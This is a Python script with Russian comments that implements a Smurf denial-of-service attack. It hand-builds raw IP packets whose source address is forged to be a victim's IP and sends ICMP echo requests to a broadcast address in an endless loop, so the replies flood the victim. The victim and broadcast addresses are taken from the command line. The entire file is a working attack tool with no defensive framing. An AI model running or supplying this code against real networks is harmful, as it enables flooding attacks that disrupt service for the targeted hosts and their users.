import sys
import socket
import struct


def checksum(source_string):
    """Расчет контрольной суммы"""
    sum = 0
    count_to = (len(source_string) // 2) * 2
    for count in range(0, count_to, 2):
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


def create_icmp_packet():
    """Создание ICMP пакета"""
    packet = struct.pack('bbHHh', 8, 0, 0, 1, 1)
    my_checksum = checksum(packet)
    packet = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), 1, 1)
    return packet


def send_smurf_attack(victim_ip, broadcast_ip):
    """
    Отправка ICMP пакетов на широковещательный адрес
    с поддельным IP-адресом источника
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        packet = create_ip_packet(victim_ip, broadcast_ip)
        while True:
            sock.sendto(packet, (broadcast_ip, 0))
    except KeyboardInterrupt:
        print(f'Атака остановлена')
    except Exception as e:
        print(f'Произошла ошибка: {e}')
    finally:
        sock.close()


def create_ip_packet(source_ip, dest_ip):
    """Создание полного IP-пакета с поддельным источником"""
    ip_ver = 4
    ip_ihl = 5
    ip_tos = 0
    ip_tot_len = 0
    ip_id = 1
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_ICMP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_proto,
                            ip_check,
                            ip_saddr,
                            ip_daddr)
    icmp_packet = create_icmp_packet()
    packet = ip_header + icmp_packet
    ip_tot_len = len(packet)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            ip_ihl_ver,
                            ip_tos,
                            ip_tot_len,
                            ip_id,
                            ip_frag_off,
                            ip_ttl,
                            ip_proto,
                            ip_check,
                            ip_saddr,
                            ip_daddr)
    return ip_header + icmp_packet


if __name__ == '__main__':
    if len(sys.argv) != 3:
        sys.exit(1)
    victim_ip = sys.argv[1]
    broadcast_ip = sys.argv[2]
    try:
        socket.inet_aton(victim_ip)
        socket.inet_aton(broadcast_ip)
    except socket.error:
        print('Неверный IP адрес')
        sys.exit(1)
    send_smurf_attack(victim_ip, broadcast_ip)
